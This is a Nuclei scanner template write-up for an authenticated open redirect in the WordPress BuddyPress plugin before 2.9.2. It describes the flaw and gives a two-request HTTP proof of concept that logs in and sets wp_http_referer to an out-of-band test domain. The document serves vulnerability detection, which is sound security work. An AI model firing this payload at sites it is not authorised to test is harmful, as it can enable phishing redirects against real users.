# Nuclei Template: WordPress BuddyPress < 2.9.2 - Authenticated Open Redirect
**Template ID:** wp-buddypress-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Low
**CWE:** CWE-601
**Source:** Nuclei Template (`wp-buddypress-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress BuddyPress plugin before 2.9.2 contains an authenticated open redirect vulnerability via the wp_http_referer parameter on the bp-profile-edit admin page. After updating profile, the Back to Users link redirects to the attacker-specified URL.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro&updated=1 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://hackerone.com/reports/277502
- https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/
